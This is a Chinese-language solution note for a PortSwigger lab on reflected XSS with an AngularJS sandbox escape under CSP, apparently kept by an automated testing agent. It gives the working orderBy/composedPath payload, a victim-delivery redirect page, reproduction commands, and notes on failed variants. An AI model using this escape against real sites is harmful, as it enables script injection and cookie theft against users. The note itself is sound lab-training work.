---
title: lab-angular-sandbox-escape-and-csp
---

# lab-angular-sandbox-escape-and-csp

> evidences: [[client-side-template-injection-family]]

- 题面:Reflected XSS with AngularJS sandbox escape and CSP(/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)
- 实例(批45R):https://0a250081046e102e84926863003900e5.web-security-academy.net · exploit:https://exploit-0a32003704b510d4847467ca013f005b.exploit-server.net
- 判定目标:CSP(`script-src 'self'` + `ng-csp`)下逃逸 AngularJS 沙箱并 `alert(document.cookie)`;状态:**solved**(横幅 `<h4>Congratulations, you solved the lab!</h4>`,`banner_verdict.solved=true`)

## 收口载荷(79/80 字符,一次交付即翻牌)

```
https://<inst>/?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>#x
交付页: <script>location='https://<inst>/?search=%3Cinput%20id%3Dx%20ng-focus%3D%24event.composedPath()%7CorderBy%3A%27(y%3Dalert)(document.cookie)%27%3E#x'</script>
```

- 长度上限是服务端硬约束:81+ → 400 正文 `"Search term cannot exceed 80 characters"`。
- 触发:`#x` 片段聚焦即可,**不需要 `autofocus`**(它 +10 字符会撑破预算)。批38 判「片段聚焦早于 bootstrap」是**假阴性**——见下「聚焦态」。
- 执行原语:`$event.composedPath()`(21,取到含 window 的数组,expensive 检查只查数组本身)→ `|orderBy:'<谓词>'`(字符串谓词由非 expensive 的 `$parse` 编译、**以每个数组元素为 scope** 求值,末元素 window)→ `(y=alert)(document.cookie)`(赋值式调用绕开 isecwindow;裸 `alert(...)` 报 `[$parse:isecwindow]`)。

## 关键判读细节(勘误 + 武器级)

1. **只有字符串形谓词逐元素求值**:`|filter:'…'` → `Maximum call stack size exceeded`(filterFilter 对字符串走子串匹配,遇 window 递归);`|orderBy:(y=alert)(document.cookie)`(不带引号)→ **参数只在外层 scope 求值一次,是空操作**(实测返回数组、无 alert)。必须 `orderBy:'…'`。
2. **聚焦态是判读前提**:`document.hasFocus()===false` 时 Chrome 只设 `document.activeElement`、**不发 focus 事件** ⇒ 所有 focus 触发链在 harness 浏览器里系统性假阴性。`Page.bringToFront` 后 `hasFocus=true`,同一载荷 `page_alert` 立刻 `fired=true, alerts:["alert:"]`。先 `browser_suite call Page.bringToFront`(或 `Emulation.setFocusEmulationEnabled`)再判 focus 类载荷。
3. oracle 法(不必真导航):页面内 `angular.element(document.body).injector().get('$parse')(EXPR,null,true)(scope,{$event:{composedPath:()=>path}})`;`path` 用 `el.dispatchEvent(new FocusEvent('focus'))` 期间 `e.composedPath()` 捕获。

## 证据摘录

```
banner_verdict → {"solved":true,"solved_class":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
page_alert "<载荷URL>#x" → {"fired":true,"alerts":["alert:"]}          # cookie 为空 ⇒ 消息为 ""
$parse oracle: orderBy:'(y=alert)(document.cookie)' → log [""] ; filter 形 → Maximum call stack ; 无引号形 → 无动作
100 字符探测 → 400 "Search term cannot exceed 80 characters"
```

## 复现命令

```
range_launch launch 978FEBC1…9A51C363 --jar ~/.pi-rs/agent/chrome-jar.json
browser_suite call Page.bringToFront
page_alert "https://<inst>/?search=%3Cinput%20id%3Dx%20ng-focus%3D%24event.composedPath()%7CorderBy%3A%27(y%3Dalert)(document.cookie)%27%3E#x"
http_session post "https://<exploit>/" --jar <jar> --follow --form urlIsHttps=on --form responseFile=/exploit \
  --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' \
  --form 'responseBody=<script>location='"'"'https://<inst>/?search=…%27%3E#x'"'"'</script>' --form formAction=DELIVER_TO_VICTIM
```

## 关系

- 族:[[client-side-template-injection-family]](CSP 变体行);沙箱细节见 [[angularjs-1-4-4-sandbox-escape-practice-notes]]。
